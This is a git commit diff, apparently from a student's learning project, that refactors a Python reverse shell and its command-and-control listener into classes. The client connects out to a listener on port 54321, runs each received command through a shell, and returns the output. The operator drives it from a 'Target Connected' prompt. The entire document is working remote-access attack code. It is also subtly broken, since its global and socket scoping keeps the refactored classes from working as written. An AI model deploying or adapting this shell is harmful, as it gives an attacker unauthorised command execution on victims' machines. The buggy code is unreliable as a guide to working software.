2a611d5361ed9d6e274c2b1c91a32526621dfd47
Coline Berrue <coline.berrue@epita.fr>
2022-05-15 14:08:00 +0100

    class created

--- reverse.py
+++ reverse.py
@@ -1,31 +1,58 @@
 import socket
 import subprocess
+import json
 
-# declaration of the socket
-# see documentation
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Reverse_Shell:
+    global sock
+    global command
 
-# connection to the server
-ipaddress = ""
-sock.connect((ipaddress, 54321))
-print("Connection established to the server")
+    # declaration of the socket
+    # see documentation
 
-while True:
-    command = sock.recv(1024)
-    if command == "q":
-        break
-    else:
-        # creation of the command, see documentation
-        proc = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE
-        )
-        result = proc.stdout.read() + proc.stderr.read()
-        sock.send(result)
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        sock.send(json_data)
 
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + sock.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
-# close the socket
-sock.close()
+    def connection(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # connection to the server
+        ipaddress = ""
+        sock.connect((ipaddress, 54321))
+        print("Connection established to the server")
+
+    def execute_command(self):
+        while True:
+            command = self.reliable_receive()
+            if command == "q":
+                break
+            else:
+                # creation of the command, see documentation
+                proc = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE
+                )
+                result = proc.stdout.read() + proc.stderr.read()
+                self.reliable_send(result)
+
+    def end_connection(self):
+        # close the socket
+        sock.close()
+
+    def main(self):
+        self.connection()
+        self.execute_command()
+        if command == "q":
+            self.end_connection()
--- server.py
+++ server.py
@@ -1,40 +1,67 @@
 import socket
-import subprocess
+import json
 
-# reread the documentation of socket library
-# declaration of the socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+class Server:
+    global s
+    global ip
+    global target
+    global command
 
-# bind the port and the host
-# the port number doesn't matter as long there is nothing on it
-# find the right ip address before starting the server
-ipaddress = ""
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        target.send(json_data)
 
-s.bind((ipaddress, 54321))
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + target.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
-# the socket will listen to five connection
-s.listen(5)
+    def shell(self):
+        while True:
+            # creation of simple command
+            command = input("* Shell#-%s: " % str(ip))
+            # send the command
+            self.reliable_send(command)
+            if command == "q":
+                break
+            else:
+                answer = self.reliable_receive()
+                # print the answer from the reverse shell
+                print(answer)
 
-print("Listening for incoming connection")
+    def server(self):
+        # reread the documentation of socket library
+        # declaration of the socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-target, ip = s.accept()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-print("Target Connected !")
-while True:
-    # creation of simple command
-    command = input("* Shell#-%s: " % str(ip))
-    # send the command
-    target.send(
-        command
-    )
-    if command == "q":
-        break
-    else:
-        answer = target.recv(1024)
-        # print the answer from the reverse shell
-        print(answer)
+        # bind the port and the host
+        # the port number doesn't matter as long there is nothing on it
+        # find the right ip address before starting the server
+        ipaddress = ""
 
-# close the connection
-s.close()
+        s.bind((ipaddress, 54321))
+
+        # the socket will listen to five connection
+        s.listen(5)
+
+        print("Listening for incoming connection")
+
+        target, ip = s.accept()
+
+        print("Target Connected !")
+
+    def end_connection(self):
+        s.close()
+
+    def main(self):
+        self.server()
+        self.shell()
+        if command == "q":
+            self.end_connection()
